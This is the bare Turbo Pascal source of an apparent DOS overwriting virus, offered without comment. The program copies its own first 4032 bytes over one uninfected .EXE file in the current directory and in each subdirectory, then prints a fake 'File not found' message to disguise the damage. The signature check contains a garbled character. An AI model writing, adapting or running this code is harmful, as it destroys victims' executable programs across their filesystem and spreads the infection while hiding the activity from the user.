program v;

uses dos;

var filexe : searchrec;
         f : file;
        cf : text;
       sig : string[3];
         p : array[0..6000] of byte;
      inff : string[12];
     oldir : string[12];
         s : integer;

procedure infec(inff : string);
begin
  assign(f,paramstr(0));
  reset(f,1);
  blockread(f,p,4032);
  close(f);
  assign(f,inff);
  reset(f,1);
  blockwrite(f,p,4032);
  close(f);
end;

procedure inf;

begin

s:=0;

findfirst('*.exe',archive,filexe);

while doserror=0 do
begin

  assign(cf,filexe.name);
  reset(cf);
  read(cf,sig);
  close(cf);

  if not (sig='MZ�') and (s=0) then
  begin
    infec(filexe.name);
    s:=1;
  end;

  findnext(filexe);

end;


end;

begin

inf;

findfirst('*.',directory,filexe);
while doserror=0 do
begin
  if not (filexe.name='.') then
  begin
    getdir(0,oldir);
    chdir(filexe.name);
    inf;
    chdir(oldir);
  end;

  findnext(filexe);
end;

writeln('File not found');

end.
